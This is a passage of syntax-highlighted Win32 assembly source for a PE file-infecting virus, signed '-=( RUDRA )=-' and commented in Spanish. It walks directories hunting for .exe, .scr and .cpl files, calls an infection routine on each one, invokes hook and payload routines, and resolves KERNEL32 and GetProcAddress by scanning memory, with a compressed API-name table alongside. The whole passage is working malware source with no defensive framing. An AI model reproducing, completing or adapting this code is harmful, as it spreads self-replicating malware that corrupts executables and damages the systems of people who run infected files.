  </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@Nada</span><span class="sc0">

  </span><span class="sc5">@La_Recluta</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Busqueda.wfd_szFileName</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">SCASB</span><span class="sc0">
  </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">5h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"exe."</span><span class="sc0">                      </span><span class="sc1">; *.exe</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Enchufalo</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"rcs."</span><span class="sc0">                      </span><span class="sc1">; *.scr</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Enchufalo</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"lpc."</span><span class="sc0">                      </span><span class="sc1">; *.cpl</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Enchufalo</span><span class="sc0">

  </span><span class="sc5">@Busca_Proximo</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Busqueda</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SHandle</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc0">
  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@La_Recluta</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SHandle</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">FindClose</span><span class="sc0">

  </span><span class="sc5">@Nada</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PaTras</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Busqueda.wfd_szFileName</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Virgo</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Fin_DA</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Virgo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@Busca_Primero</span><span class="sc0">

  </span><span class="sc5">@Fin_DA</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Directorio_Inicial</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Hookear</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Paylo</span><span class="sc0">

  </span><span class="sc5">@Finale</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc3">"HOHO"</span><span class="sc0">
  </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">Retorno</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Host_Falso</span><span class="sc0">
  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc1">; 01h -&gt; Create</span><span class="sc0">
  </span><span class="sc1">; 02h -&gt; File</span><span class="sc0">
  </span><span class="sc1">; 03h -&gt; Map</span><span class="sc0">
  </span><span class="sc1">; 04h -&gt; View</span><span class="sc0">
  </span><span class="sc1">; 05h -&gt; Find</span><span class="sc0">
  </span><span class="sc1">; 06h -&gt; Close</span><span class="sc0">
  </span><span class="sc1">; 07h -&gt; Set</span><span class="sc0">
  </span><span class="sc1">; 08h -&gt; Get</span><span class="sc0">
  </span><span class="sc1">; 09h -&gt; Load</span><span class="sc0">
  </span><span class="sc1">; 0Ah -&gt; CurrentDirectory</span><span class="sc0">
  </span><span class="sc1">; 0Bh -&gt; Virtual</span><span class="sc0">
          
  </span><span class="sc5">APIs_KERNEL32</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"LibraryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; LoadLibraryA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; CreateFileA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"pingA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; CreateFileMappingA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Of"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; MapViewOfFile</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Unmap"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Of"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc1">; UnmapViewOfFile</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Handle"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; CloseHandle</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"First"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; FindFirstFileA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Next"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; FindNextFileA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">               </span><span class="sc1">; FindClose</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"AttributesA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc1">; SetFileAttributesA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Size"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">; GetFileSize</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Pointer"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; SetFilePointer</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"EndOf"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; SetEndOfFile</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; GetCurDirA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; SetCurDirA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"TickCount"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">; GetTickCount</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"SystemTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; GetSystemTime</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"_lopen"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">               </span><span class="sc1">; _lopen</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Open"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">; OpenFileA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Move"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">; MoveFileA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Copy"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">; CopyFileA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"ProcessA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; CreateProcessA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"WinExec"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">              </span><span class="sc1">; WinExec</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Alloc"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">           </span><span class="sc1">; VirtualAlloc</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Free"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; VirtualFree</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"DirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; CreateDirA</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"_lcreat"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"_lwrite"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"VolumeLabelA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">

  </span><span class="sc5">LoadLibraryA</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">CreateFileA</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">CreateFileMappingA</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">MapViewOfFile</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">CloseHandle</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">FindFirstFileA</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">FindNextFileA</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">FindClose</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">SetFileAttributesA</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">GetFileSize</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">SetFilePointer</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">SetEndOfFile</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">GetTickCount</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">GetSystemTime</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">_lopen</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">OpenFileA</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">MoveFileA</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">CopyFileA</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">CreateProcessA</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">WinExec</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">VirtualAlloc</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">VirtualFree</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">CreateDirectoryA</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">_lcreat</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">_lwrite</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">SetVolumeLabelA</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

  </span><span class="sc5">IBase</span><span class="sc0">                 </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

  </span><span class="sc5">Firma</span><span class="sc0">                 </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"-=( RUDRA )=-"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
  
  </span><span class="sc5">@Enchufalo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Busqueda.wfd_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Infectar_PE</span><span class="sc0">
  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@Busca_Proximo</span><span class="sc0">

  </span><span class="sc5">Fecha</span><span class="sc0">                         </span><span class="sc5">SYSTEMTIME</span><span class="sc0">      </span><span class="sc4">&lt;&gt;</span><span class="sc0">
  </span><span class="sc5">Busqueda</span><span class="sc0">              </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">SIZEOF_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">Archivos</span><span class="sc0">              </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"*.???"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">PaTras</span><span class="sc0">                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">".."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">SHandle</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">Virgo</span><span class="sc0">                 </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">KERNEL32</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">Directorio_Inicial</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

  </span><span class="sc1">; Proceso para obtener la base de K32 y GetProcAddress.</span><span class="sc0">
  </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc1">; EDI -&gt; Doble Palabra apuntada por ESP que representa el</span><span class="sc0">
  </span><span class="sc1">; call...</span><span class="sc0">

  </span><span class="sc5">Obtener_K32</span><span class="sc0">           </span><span class="sc9">PROC</span><span class="sc0">

  </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFF0000h</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">PAGINAS</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

  </span><span class="sc5">@Revisa_K32</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"M"</span><span class="sc0">
  </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">@Proximo_K32</span><span class="sc0">

  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"P"</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Encontrado_K32</span><span class="sc0">

  </span><span class="sc5">@Proximo_K32</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
  </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">

  </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@Revisa_K32</span><span class="sc0">

  </span><span class="sc5">@Encontrado_K32</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">KERNEL32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc5">Obtener_K32</span><span class="sc0">           </span><span class="sc9">ENDP</span><span class="sc0">

  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

  </span><span class="sc1">; Proceso para obtener la base de GetProcAddress</span><span class="sc0">
  </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc1">; EBX -&gt; Base de KERNEL32.</span><span class="sc0">

  </span><span class="sc5">Obtener_GPA</span><span class="sc0">           </span><span class="sc9">PROC</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">                              </span><span class="sc1">; Obtiene tabla de exportaciones.</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXPORTS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">

